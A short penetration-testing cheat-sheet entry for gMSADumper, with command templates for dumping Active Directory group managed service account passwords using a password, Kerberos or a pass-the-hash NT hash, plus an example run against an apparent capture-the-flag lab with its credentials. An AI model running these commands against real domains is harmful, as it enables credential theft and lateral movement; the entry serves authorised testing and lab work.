# gmsadumper

% Active directory, password, ReadGMSAPassword, Group managed service accounts 
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  

## get passwords

https://github.com/micahvandeusen/gMSADumper
Example: gMSADumper.py -u tiffany.molina -p NewIntelligenceCorpUser9876 -l 10.10.10.248  -d intelligence.htb

```
gmsadumper -u <user> -p <password> -l <dc> -d <domain_fqdn> 
```

## get passwords (kerberos auth)

https://github.com/micahvandeusen/gMSADumper

```
gmsadumper -k -l <dc> -d <domain_fqdn> 
```

## get passwords (PtH auth)

https://github.com/micahvandeusen/gMSADumper

```
gmsadumper -u <user> -p <nt_hash> -l <dc> -d <domain_fqdn> 
```

